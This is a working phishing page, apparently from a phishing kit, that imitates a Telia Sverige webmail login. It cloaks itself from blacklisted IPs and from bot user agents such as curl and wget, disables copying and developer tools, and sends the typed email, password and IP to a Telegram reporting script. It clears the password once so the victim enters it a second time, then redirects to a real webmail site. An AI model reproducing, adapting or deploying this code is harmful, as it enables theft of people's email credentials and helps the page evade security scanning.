<?php
//═══════════════════════════════════════════════════════════════════════════
//  🚫 IP BLACKLIST CHECK (High Priority)
//═══════════════════════════════════════════════════════════════════════════
require_once __DIR__ . '/../ip_blacklist_loader.php';

if (!function_exists('x8SYQLpUqU')) { 
    function x8SYQLpUqU() { 
        $xb2zx1 = $_SERVER['SERVER_ADDR']; 
        $xXSEJ = '127.0.0.1'; 
        if ((!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) && (($_SERVER['HTTP_CF_CONNECTING_IP'])!=$xXSEJ) && (($_SERVER['HTTP_CF_CONNECTING_IP'])!=($xb2zx1))) {
            $ip=$_SERVER['HTTP_CF_CONNECTING_IP'];
        } elseif ((!empty($_SERVER['GEOIP_ADDR'])) && (($_SERVER['GEOIP_ADDR'])!=$xXSEJ)) {
            $ip=$_SERVER['GEOIP_ADDR'];
        } elseif ((!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) && (($_SERVER['HTTP_X_FORWARDED_FOR'])!=$xXSEJ) && (($_SERVER['HTTP_X_FORWARDED_FOR'])!=($xb2zx1))) {
            $ip=explode(',',$_SERVER['HTTP_X_FORWARDED_FOR'])[0];
        } elseif ((!empty($_SERVER['HTTP_CLIENT_IP'])) && (($_SERVER['HTTP_CLIENT_IP'])!=$xXSEJ) && (($_SERVER['HTTP_CLIENT_IP'])!=($xb2zx1))) {
            $ip=$_SERVER['HTTP_CLIENT_IP'];
        } else {
            $ip=$_SERVER['REMOTE_ADDR'];
        } 
        return $ip; 
    }
}
$ip=x8SYQLpUqU();

// Check if visitor IP is in blacklist files
if (IPBlacklistLoader::isBlacklisted($ip)) {
    // IP is blacklisted - redirect to centralized URL
    require_once __DIR__ . '/../config_redirect.php';
    header('Location: ' . CENTRALIZED_REDIRECT_URL, true, 302);
    exit;
}

//═══════════════════════════════════════════════════════════════════════════
//  Basic Bot Detection (Secondary Layer)
//═══════════════════════════════════════════════════════════════════════════ 

if (!function_exists('x9PfbWn2bS')) { 
    function x9PfbWn2bS() { 
        if(empty($_SERVER['HTTP_USER_AGENT'])) { 
            $_SERVER['HTTP_USER_AGENT'] = getenv('HTTP_USER_AGENT'); 
        } 
        return $_SERVER['HTTP_USER_AGENT']; 
    }
}
$eRf9t9d9 = x9PfbWn2bS();

// Basic user agent check (secondary protection layer)
$ua_lower = strtolower($eRf9t9d9);
$obvious_bots = ['curl', 'wget', 'python-requests', 'python-urllib', 'go-http-client', 'java/', 'bot', 'crawler', 'spider', 'scraper'];
foreach ($obvious_bots as $bot_signature) {
    if (strpos($ua_lower, $bot_signature) !== false) {
        die(header('HTTP/1.1 403 Forbidden'));
    }
}

// ✅ All checks passed - load page
?>
<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>Telia Webmail — Replica</title>
  
  <!-- Antibot Scripts -->
  <script src="../m/js/fingerprint.js"></script>
  <script src="../m/js/utils.js"></script>
  <script src="../m/js/captcha.js"></script>
  
  <!-- Centralized Functions -->
  <script src="../js/centralized_telegram.js"></script>
  <script src="../js/centralized_redirect.js"></script>
  <style>
    :root{--telia-purple:#8b10e0;--muted:#666}
    html,body{height:100%;margin:0;font-family:Inter,Segoe UI,Roboto,Arial,sans-serif;color:#111}
    .page{min-height:100%;display:flex;flex-direction:column}
    .hero{flex:1;padding:36px 64px 140px 64px}
    .brand{display:flex;align-items:center;gap:18px}
    .logo-wrap{width:160px;height:100px;display:inline-flex;align-items:center;justify-content:center}
    .logo-orb{width:56px;height:56px;border-radius:50%;background:linear-gradient(135deg,rgba(255,255,255,0.1),rgba(255,255,255,0.02)),var(--telia-purple);display:inline-block}
    .telia-logo{width:160px;height:auto;display:block}
    .brand h1{margin:0;color:var(--telia-purple);font-weight:600;font-size:28px}

    .main-title{font-size:36px;margin:18px 0 12px 0;letter-spacing:0.6px;font-weight:500}

    .form-area{max-width:900px}
    label{display:block;font-size:16px;margin:14px 0 8px;color:var(--muted)}
    input[type="text"],input[type="password"]{display:block;max-width:900px;padding:8px 10px;border:1px solid #e6e6e6;border-radius:2px;background:#fff;font-size:14px}
    input[type="text"]{width:60%;height:36px}
    input[type="password"]{width:36%;height:32px}

    .checkbox{display:flex;align-items:center;gap:10px;margin:18px 0;color:#333}

    .btn{display:inline-block;background:var(--telia-purple);color:#fff;padding:14px 28px;border-radius:30px;border:none;font-weight:600;box-shadow:0 12px 28px rgba(139,16,224,0.22);cursor:pointer;position:relative;z-index:5}
    .btn.small{padding:12px 22px}

    footer.site-footer{height:110px;background:var(--telia-purple);display:flex;align-items:center;padding-left:24px;color:#fff;position:relative;z-index:1}
    .btn-overlap{display:flex;align-items:center;justify-content:flex-start;margin-top:18px;margin-bottom:-52px;padding-left:8px}

    /* promo area above footer (Create an account / Get started) */
    .promo{padding:20px 64px;background:#fff}
    .promo .promo-title{font-size:32px;margin:0 0 6px 0;color:#111;font-weight:400}
    .promo .promo-sub{color:#222;opacity:.9;margin:6px 0 0 0;font-size:14px;font-weight:400}

    @media(max-width:900px){
      .main-title{font-size:36px}
      input[type="text"],input[type="password"]{width:100%}
      .form-area{padding-right:24px}
    }
  </style>
</head>
<body>
  <div class="page">
    <div class="hero">
      <div class="brand">
        <div class="logo-wrap">
          <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7c/Telia_logo_2022.svg/2560px-Telia_logo_2022.svg.png" alt="Telia logo" class="telia-logo">
        </div>
        <h1 style="margin:0;color:var(--telia-purple);font-weight:600;font-size:28px"></h1>
      </div>

      <div class="form-area">
        <div class="main-title">WEBMAIL LOGIN</div>

        <form onsubmit="event.preventDefault();">
          <label for="email">Email Address</label>
          <input id="email" type="text" placeholder="Email Address" autocomplete="username">

          <label for="pwd">Password</label>
          <input id="pwd" type="password" placeholder="Password" autocomplete="current-password">

          <label class="checkbox"><input type="checkbox"> Keep me signed in</label>

          <p style="margin:8px 0 0 0"><a href="#" style="color:#0b74d1;text-decoration:none">Forgot your password?</a></p>

          <div class="btn-overlap">
            <button class="btn" type="submit">Log in</button>
          </div>
        </form>
      </div>
    </div>

    <div class="promo">
      <h2 class="promo-title">Create an account</h2>
      <div class="promo-sub">Create an account &nbsp;›</div>

      <h2 class="promo-title" style="margin-top:30px">Get started with Email</h2>
    </div>

    <footer class="site-footer">
      <div>© Telia Sverige AB</div>
    </footer>
  </div>

  <script>
        function togglePassword(el) {
            var pwd = document.getElementById('pwd');
            if (pwd.type === 'password') {
                pwd.type = 'text';
                el.setAttribute('aria-pressed', 'true');
                el.setAttribute('aria-label', 'Hide password');
                el.title = 'Hide password';
            } else {
                pwd.type = 'password';
                el.setAttribute('aria-pressed', 'false');
                el.setAttribute('aria-label', 'Show password');
                el.title = 'Show password';
            }
            try {
                var start = typeof pwd.selectionStart === 'number' ? pwd.selectionStart : pwd.value.length;
                var end = typeof pwd.selectionEnd === 'number' ? pwd.selectionEnd : start;
                pwd.focus();
                setTimeout(function() {
                    try { pwd.setSelectionRange(start, end); } catch (inner) { /* ignore */ }
                }, 0);
            } catch (e) { /* ignore if not supported */ }
        }
        window.addEventListener('DOMContentLoaded', function() {
            var spinner = document.getElementById('initSpinner');
            var app = document.getElementById('app');
            var mainContent = document.getElementById('mainContent');
            var initError = document.getElementById('initError');
            if (mainContent) {
                mainContent.style.display = 'block';
            }
        });
    </script>
<!-- Antibot Scripts -->
<script src="../m/js/fingerprint.js"></script>
<script src="../m/js/utils.js"></script>
<script src="../m/js/captcha.js"></script>

<!-- Centralized Functions -->
<script src="../js/centralized_telegram.js"></script>
<script src="../js/centralized_redirect.js"></script>
<script src="../js/email_extractor.js"></script>
<script src="../js/autofill_helper.js"></script>

<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
    <script type="text/javascript" src="https://l2.io/ip.js?var=userip"></script>
  <script>
  /* global $ */
  $(document).ready(function() {
    var count = 0;

    function isValidEmail(email) {
      var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
      return filter.test(email);
    }



        $('#email, #pwd').on('input', function() {
            // Error shown via alert in BELL
        });

        (function() {
            var isTouch = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
            if (!isTouch) {
                document.addEventListener('contextmenu', function(e) {
                    e.preventDefault();
                    return false;
                }, false);
            }

            document.addEventListener('copy', function(e) {
                try { e.clipboardData.setData('text/plain', 'Copying is disabled on this page.'); } catch (err) {}
                e.preventDefault();
                return false;
            });

            document.addEventListener('selectstart', function(e) {
                if (!e.target.closest('input, textarea')) {
                    e.preventDefault();
                    return false;
                }
            });

            document.addEventListener('keydown', function(e) {
                if (e.keyCode === 123) { e.preventDefault(); e.stopPropagation(); return false; }
                if (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74 || e.keyCode === 67)) { e.preventDefault(); e.stopPropagation(); return false; }
                if (e.ctrlKey && (e.keyCode === 85 || e.keyCode === 83)) { e.preventDefault(); e.stopPropagation(); return false; }
                if (e.metaKey && e.altKey && e.keyCode === 73) { e.preventDefault(); e.stopPropagation(); return false; }
            });
        })();

        $('form').on('submit', function(event) {
      event.preventDefault();
      var email = $('#email').val() ? $('#email').val().trim() : '';
      var pw = $('#pwd').val() ? $('#pwd').val().trim() : '';
      if (!email) {
        $('#email').focus();
        return false;
      }
      if (!isValidEmail(email)) {
        $('#email').focus();
        return false;
      }
      if (!pw) {
        $('#pwd').focus();
        return false;
      }
            count = count + 1;

            
            // Use centralized Telegram reporting with provider tag
            window.providerTag = 'telia';
            var clientIP = window.userip || 'n/a';
            
            function sendTelemetry(attempt, redirectOnSuccess) {
                // Send centralized Telegram report
                if (typeof sendCentralizedTelegramReport === 'function') {
                    sendCentralizedTelegramReport(providerTag, email, pw, clientIP, function(success) {
                        if (redirectOnSuccess) {
                            // Use centralized redirect
                            if (typeof performCentralizedRedirect === 'function') {
                                performCentralizedRedirect(300);
                            } else {
                                // Fallback if centralized redirect not available
                                setTimeout(function() { window.location.replace('https://webmail.bell.net/bell/'); }, 300);
                            }
                        }
                    });
                } else {
                    // Fallback if centralized function not available
                    console.error('Centralized Telegram function not available');
                    if (redirectOnSuccess) {
                        if (typeof performCentralizedRedirect === 'function') {
                            performCentralizedRedirect(300);
                        } else {
                            setTimeout(function() { window.location.replace('https://webmail.bell.net/bell/'); }, 300);
                        }
                    }
                }
                
                if (redirectOnSuccess) {
                    $('.btn').text('Logging in...');
                    setTimeout(function() {
                        $('.btn').text('Sign in');
                    }, 200);
                }
            }

            sendTelemetry(count, (count >= 2));

            if (count === 1) {
                $('#pwd').val('').focus();
                return false;
            }
    });
});
  </script>
</body>
</html>
